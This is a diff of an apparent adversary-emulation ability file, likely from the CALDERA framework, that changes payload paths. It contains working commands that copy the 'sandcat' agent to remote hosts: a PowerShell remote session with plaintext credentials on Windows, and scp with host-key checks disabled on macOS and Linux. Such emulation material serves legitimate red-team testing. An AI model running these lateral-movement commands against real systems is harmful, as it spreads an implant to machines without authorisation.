@@ -15,19 +15,19 @@
         $secstr = New-Object -TypeName System.Security.SecureString;
         $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
         $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-        $File = [System.IO.File]::ReadAllBytes("#{files}\sandcat.exe");
+        $File = [System.IO.File]::ReadAllBytes("sandcat.exe");
         $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-        Copy-Item -Path #{files}\sandcat.exe -Destination 'C:\Users\Public\' -ToSession $session
+        Copy-Item -Path sandcat.exe -Destination 'C:\Users\Public\' -ToSession $session
       payload: sandcat.exe
     darwin:
       command: |
-        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{files}/sandcat-linux #{remote.ssh.cmd}:~
+        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat-linux #{remote.ssh.cmd}:~
       cleanup: |
         ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat-linux'
       payload: sandcat-linux
     linux:
       command: |
-        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{files}/sandcat-linux #{remote.ssh.cmd}:~ &&
+        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat-linux #{remote.ssh.cmd}:~ &&
       cleanup: |
         ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat-linux'
       payload: sandcat-linux
